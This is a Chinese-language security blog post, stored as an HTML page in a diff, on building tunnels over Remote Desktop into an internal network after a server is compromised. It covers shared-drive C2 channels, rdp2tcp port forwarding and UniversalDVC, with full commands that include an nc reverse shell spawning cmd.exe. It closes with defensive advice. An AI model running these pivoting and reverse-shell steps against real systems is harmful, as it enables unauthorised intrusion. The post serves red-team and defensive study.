@@ -1,0 +1,451 @@
+I"�C<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>最近从@cpl3h的博客中学到了使用远程桌面协议建立通道的方法。</p>
+
+<p>本文将对这个方法进行整理，结合自己的经验，添加个人理解。</p>
+
+<p>学习地址：</p>
+
+<p>https://ijustwannared.team/2019/11/07/c2-over-rdp-virtual-channels/</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>使用场景</li>
+  <li>使用共享文件建立通道</li>
+  <li>使用rdp2tcp建立通道</li>
+  <li>使用UniversalDVC建立通道</li>
+  <li>利用分析</li>
+  <li>防御建议</li>
+</ul>
+
+<h2 id="0x02-使用场景">0x02 使用场景</h2>
+<hr />
+
+<p>由于防火墙的设置，只能连接一台Windows服务器的远程桌面，那么如何以这台Windows服务器为跳板进入内网</p>
+
+<p>简要描述如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/1-1.png" alt="Alt text" /></p>
+
+<h2 id="0x03-使用共享文件建立通道">0x03 使用共享文件建立通道</h2>
+<hr />
+
+<p>通过读写RDP Client和RDP Server之间共享的文件作为数据传输的通道</p>
+
+<p>POC：</p>
+
+<p>https://github.com/outflanknl/external_c2</p>
+
+<p>这是根据Cobalt Strike中External C2规范编写的POC</p>
+
+<h3 id="实现原理">实现原理：</h3>
+
+<p>建立远程桌面连接时，RDP Client和RDP Server之间可以创建共享文件夹，通过读写共享文件作为数据传输的通道</p>
+
+<h3 id="1windows系统连接远程桌面并开启文件共享">1.Windows系统连接远程桌面并开启文件共享</h3>
+
+<h4 id="1通过配置mstscexe开启文件共享">(1)通过配置mstsc.exe开启文件共享</h4>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/1-2.png" alt="Alt text" /></p>
+
+<h4 id="2使用freerdp开启文件共享">(2)使用FreeRDP开启文件共享</h4>
+
+<p>下载地址：</p>
+
+<p>https://cloudbase.it/freerdp-for-windows-nightly-builds/</p>
+
+<p>命令实例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfreerdp /v:192.168.112.129:3389 -u:1 -p:Test123! /cert-ignore /drive:share1,c:\
+</code></pre></div></div>
+
+<h3 id="2kali系统连接远程桌面并开启文件共享">2.Kali系统连接远程桌面并开启文件共享</h3>
+
+<h4 id="1使用xfreerdp开启文件共享">(1)使用xfreerdp开启文件共享</h4>
+
+<p>将本地文件夹<code class="language-plaintext highlighter-rouge">/tmp</code>共享的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xfreerdp /v:192.168.112.129:3389 /u:1 /p:Test123! /cert-ignore /drive:share1,/tmp
+</code></pre></div></div>
+
+<h4 id="2使用rdesktop开启文件共享">(2)使用rdesktop开启文件共享</h4>
+
+<p>将本地文件夹<code class="language-plaintext highlighter-rouge">/tmp</code>共享的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rdesktop 192.168.112.129 -u1 -pTest123! -r disk:share1=/tmp
+</code></pre></div></div>
+
+<p>在RDP Server上，可通过<code class="language-plaintext highlighter-rouge">\\tsclient\</code>访问共享的文件资源</p>
+
+<p>通过文件读写来传输数据的具体细节可参考xpn的文章：</p>
+
+<p>https://blog.xpnsec.com/exploring-cobalt-strikes-externalc2-framework/</p>
+
+<h2 id="0x04-使用rdp2tcp建立通道">0x04 使用rdp2tcp建立通道</h2>
+<hr />
+
+<p>rdp2tcp使用RDP虚拟通道功能来复用端口</p>
+
+<p>可用的功能：</p>
+
+<ul>
+  <li>正向TCP端口转发</li>
+  <li>反向TCP端口转发</li>
+  <li>处理标准输入/输出转发</li>
+  <li>SOCKS5代理</li>
+</ul>
+
+<p>POC：</p>
+
+<p>https://github.com/V-E-O/rdp2tcp</p>
+
+<p>测试系统： Kali2 x64</p>
+
+<h3 id="1下载并编译rdp2tcp">1.下载并编译rdp2tcp</h3>
+
+<h4 id="1安装mingw-w64">(1)安装mingw-w64</h4>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt-get install mingw-w64
+</code></pre></div></div>
+
+<h4 id="2下载rdp2tcp">(2)下载rdp2tcp</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/V-E-O/rdp2tcp.git
+cd rdp2tcp
+</code></pre></div></div>
+
+<h4 id="3修改配置文件">(3)修改配置文件</h4>
+
+<p>rdp2tcp默认不支持编译64位的exe，所以这里需要修改配置文件，增加编译64位exe的配置信息</p>
+
+<p>修改文件<code class="language-plaintext highlighter-rouge">Makefile</code>，新的内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>all: client server-mingw64
+
+client: client/rdp2tcp
+client/rdp2tcp:
+	make -C client
+
+#server-mingw32: server/rdp2tcp.exe
+#server/rdp2tcp.exe:
+#	make -C server -f Makefile.mingw32
+
+server-mingw64: server/rdp2tcp64.exe
+server/rdp2tcp64.exe:
+	make -C server -f Makefile.mingw64
+
+clean:
+	make -C client clean
+#	make -C server -f Makefile.mingw32 clean
+	make -C server -f Makefile.mingw64 clean
+	make -C tools clean
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>因为我们使用了64位的操作系统，并且安装了64位的mingw，所以这里设置为生成64位的exe</p>
+
+<p>新建文件<code class="language-plaintext highlighter-rouge">/server/Makefile.mingw64</code>，内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BIN=rdp2tcp64.exe
+CC=i686-w64-mingw32-gcc
+CFLAGS=-Wall -g \
+		 -D_WIN32_WINNT=0x0501 \
+		 -I../common
+
+# -D_WIN32_WINNT=0x0501
+# -D_WIN32_WINNT=0x0501 -DDEBUG
+
+LDFLAGS=-lwtsapi32 -lws2_32
+OBJS=	../common/iobuf.o \
+	../common/print.o \
+	../common/msgparser.o \
+	../common/nethelper.o \
+	../common/netaddr.o \
+	errors.o aio.o events.o \
+	tunnel.o channel.o process.o commands.o main.o
+
+all: clean_common $(BIN)
+
+clean_common:
+	$(MAKE) -C ../common clean
+
+$(BIN): $(OBJS)
+	$(CC) -o $@ $(OBJS) $(LDFLAGS) 
+
+%.o: %.c
+	$(CC) $(CFLAGS) -o $@ -c $&lt;
+
+clean:
+	rm -f $(OBJS) $(BIN)
+</code></pre></div></div>
+
+<h4 id="4编译">(4)编译</h4>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>make
+</code></pre></div></div>
+
+<p>生成以下文件:</p>
+
+<ul>
+  <li>/server/rdp2tcp64.exe</li>
+  <li>/client/rdp2tcp</li>
+</ul>
+
+<h3 id="2安装xfreerdp">2.安装xfreerdp</h3>
+
+<p>Kali系统默认安装的xfreerdp不支持TCP重定向的功能</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/2-2.png" alt="Alt text" /></p>
+
+<p>如果支持TCP重定向的功能，程序回显的内容如下</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/2-1.png" alt="Alt text" /></p>
+
+<p>需要重新下载编译xfreerdp，这里我使用的版本是freerdp-nightly</p>
+
+<p>参考链接：</p>
+
+<p>https://ci.freerdp.com/job/freerdp-nightly-binaries/</p>
+
+<p>这里我使用的发行版为bionic，完整的安装命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "deb http://pub.freerdp.com/repositories/deb/bionic/ freerdp-nightly main " &gt;&gt;/etc/apt/sources.list
+wget -O - http://pub.freerdp.com/repositories/ADD6BF6D97CE5D8D.asc | sudo apt-key add -
+apt-get update
+apt-get install freerdp-nightly
+</code></pre></div></div>
+
+<p>对应的安装路径为<code class="language-plaintext highlighter-rouge">/opt/freerdp-nightly</code></p>
+
+<p>启动新版的xfreerdp，对应的路径为: <code class="language-plaintext highlighter-rouge">/opt/freerdp-nightly/bin/xfreerdp</code></p>
+
+<p>新版的xfreerdp支持TCP重定向，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/2-3.png" alt="Alt text" /></p>
+
+<h3 id="3使用xfreerdp连接远程桌面并建立通道">3.使用xfreerdp连接远程桌面并建立通道</h3>
+
+<p>这里介绍正向TCP端口转发的方法</p>
+
+<h4 id="1执行xfreerdp并开启tcp重定向功能">(1)执行xfreerdp并开启TCP重定向功能</h4>
+
+<p>Kali系统上执行：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/freerdp-nightly/bin/xfreerdp /v:192.168.112.129:3389 /u:1 /p:Test123! /cert-ignore /rdp2tcp:/root/rdp2tcp/client/rdp2tcp
+</code></pre></div></div>
+
+<h4 id="2将rdp2tcp64exe上传至rdp-server并执行不需要管理员权限">(2)将rdp2tcp64.exe上传至RDP Server并执行(不需要管理员权限)</h4>
+
+<p>执行结果如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/2-4.png" alt="Alt text" /></p>
+
+<h4 id="3在kali系统上启动rdp2tcppy">(3)在Kali系统上启动rdp2tcp.py</h4>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd rdp2tcp/tools
+python rdp2tcp.py
+</code></pre></div></div>
+
+<p>添加正向端口转发(本地445-&gt;192.168.112.129:445)的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python rdp2tcp.py add forward 127.0.0.1 445 192.168.112.129 445
+</code></pre></div></div>
+
+<p>输出结果如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/3-1.png" alt="Alt text" /></p>
+
+<h4 id="4访问本地445端口">(4)访问本地445端口</h4>
+
+<p>访问本地445端口的数据被转发至192.168.112.129的445端口，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/3-2.png" alt="Alt text" /></p>
+
+<p>正向端口转发建立成功</p>
+
+<h2 id="0x05-使用universaldvc建立通道">0x05 使用UniversalDVC建立通道</h2>
+<hr />
+
+<p>UniversalDVC是以注册UDVC插件的形式，使用动态虚拟通道建立通道</p>
+
+<p>POC：</p>
+
+<p>https://github.com/earthquake/UniversalDVC</p>
+
+<p>测试系统： Win7 x64</p>
+
+<h3 id="1安装udvc插件">1.安装UDVC插件</h3>
+
+<p>下载编译好的64位文件，地址如下：</p>
+
+<p>https://github.com/earthquake/UniversalDVC/files/1880297/UDVC-x64.zip</p>
+
+<p>将其中64位的dll保存在<code class="language-plaintext highlighter-rouge">%windir%\system32</code>下</p>
+
+<p>注册dll的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>regsvr32.exe UDVC-Plugin.x64.dll
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/4-1.png" alt="Alt text" /></p>
+
+<p>UDVC插件注册后将创建注册表项用来保存配置信息</p>
+
+<p>配置文件的位置：<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\AddIns\UDVC-Plugin</code></p>
+
+<p>默认监听的端口为31337</p>
+
+<p><strong>注：</strong></p>
+
+<p>在RDP Server启动UDVC-Server.exe后，UDVC插件才会开启监听端口</p>
+
+<h3 id="2实现端口转发的功能">2.实现端口转发的功能</h3>
+
+<h4 id="1将mode设置为socket-server-mode-0---default">(1)将Mode设置为<code class="language-plaintext highlighter-rouge">Socket server mode (0 - default)</code></h4>
+
+<p>修改注册表的cmd命令为:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add "hkcu\Software\Microsoft\Terminal Server Client\Default\AddIns\UDVC-Plugin" /v mode /t REG_DWORD /d 0 /f
+</code></pre></div></div>
+
+<h4 id="2设置监听端口为1234">(2)设置监听端口为1234</h4>
+
+<p>修改注册表的cmd命令为:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add "hkcu\Software\Microsoft\Terminal Server Client\Default\AddIns\UDVC-Plugin" /v port /t REG_SZ /d 1234 /f
+</code></pre></div></div>
+
+<h4 id="3启动远程桌面客户端">(3)启动远程桌面客户端</h4>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mstsc.exe
+</code></pre></div></div>
+
+<p>连接远程桌面</p>
+
+<h4 id="4rdp-server启动udvc-serverexe">(4)RDP Server启动UDVC-Server.exe</h4>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UDVC-Server.x64.exe -c -p 80 -i 192.168.112.129 -0
+</code></pre></div></div>
+
+<h4 id="5rdp-client打开浏览器并访问http1270011234">(5)RDP Client打开浏览器并访问http://127.0.0.1:1234</h4>
+
+<p>获得内网192.168.112.129:80的数据</p>
+
+<p>通道建立完成，简要流程图如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/4-2.png" alt="Alt text" /></p>
+
+<h3 id="3实现反弹shell的功能">3.实现反弹shell的功能</h3>
+
+<p>RDP Server反弹一个shell至RDP Client</p>
+
+<p>RDP Client能够实时控制RDP Server，执行cmd命令</p>
+
+<h4 id="1将mode设置为socket-client-mode-1">(1)将Mode设置为<code class="language-plaintext highlighter-rouge">Socket client mode (1)</code></h4>
+
+<p>修改注册表的cmd命令为:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add "hkcu\Software\Microsoft\Terminal Server Client\Default\AddIns\UDVC-Plugin" /v mode /t REG_DWORD /d 1 /f
+</code></pre></div></div>
+
+<h4 id="2设置监听端口为1234-1">(2)设置监听端口为1234</h4>
+
+<p>修改注册表的cmd命令为:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add "hkcu\Software\Microsoft\Terminal Server Client\Default\AddIns\UDVC-Plugin" /v port /t REG_SZ /d 1234 /f
+</code></pre></div></div>
+
+<h4 id="3启动远程桌面客户端-1">(3)启动远程桌面客户端</h4>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mstsc.exe
+</code></pre></div></div>
+
+<p>连接远程桌面</p>
+
+<h4 id="4rdp-client使用nc监听本地端口1234">(4)RDP Client使用nc监听本地端口1234</h4>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc64.exe -lvp 1234
+</code></pre></div></div>
+
+<h4 id="5rdp-server启动udvc-serverexe">(5)RDP Server启动UDVC-Server.exe</h4>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UDVC-Server.x64.exe -p 5678 -0
+</code></pre></div></div>
+
+<p>此时将建立一条动态虚拟通道：RDP Server-&gt;RDP Client:1234</p>
+
+<p>并且RDP Server开启监听端口5678</p>
+
+<h4 id="6rdp-server使用nc连接本地端口5678并指定重定向的程序为cwindowssystem32cmdexe">(6)RDP Server使用nc连接本地端口5678并指定重定向的程序为<code class="language-plaintext highlighter-rouge">c:\windows\system32\cmd.exe</code></h4>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc64.exe 127.0.0.1 5678 -e c:\windows\system32\cmd.exe
+</code></pre></div></div>
+
+<p>通道建立完成，简要流程图如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/4-3.png" alt="Alt text" /></p>
+
+<h2 id="0x06-利用分析">0x06 利用分析</h2>
+<hr />
+
+<p>对于这三种建立通道的方法(共享文件、rdp2tcp和UniversalDVC)，利用前提是已经获得了连接远程桌面的权限</p>
+
+<p>严格地说，利用这台远程桌面服务器，就已经能够对内网资源进行访问</p>
+
+<p>研究这种方法的意义在于某些情况下远程桌面服务器无法运行我们的程序</p>
+
+<p>例如远程桌面服务器为Windows系统，而我们想执行的程序只支持Linux，这就避免了考虑程序移植的问题</p>
+
+<h2 id="0x07-防御建议">0x07 防御建议</h2>
+<hr />
+
+<p>1.外网远程桌面服务器的安全</p>
+
+<p>如果攻击者能够使用远程桌面协议建立通道，代表攻击者已经获得了这台服务器的权限，所以对于开放外网访问的远程桌面服务器，不仅要及时更新补丁，还要注意防范口令爆破</p>
+
+<p>2.使用组策略禁用重定向的设备</p>
+
+<p>组策略位置：</p>
+
+<p><code class="language-plaintext highlighter-rouge">Computer Configuration</code>-&gt;<code class="language-plaintext highlighter-rouge">Administrative Templates</code>-&gt;<code class="language-plaintext highlighter-rouge">Windows Components</code>-&gt;<code class="language-plaintext highlighter-rouge">Remote Desktop Services</code>-&gt;<code class="language-plaintext highlighter-rouge">Remote Desktop Session Host</code>-&gt;<code class="language-plaintext highlighter-rouge">Device and Resource Redirection</code></p>
+
+<h2 id="0x08-小结">0x08 小结</h2>
+<hr />
+
+<p>本文参考@cpl3h的文章，对使用远程桌面协议建立通道的方法进行整理，结合自己的经验，添加个人理解，分析利用思路，总结防御建议。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
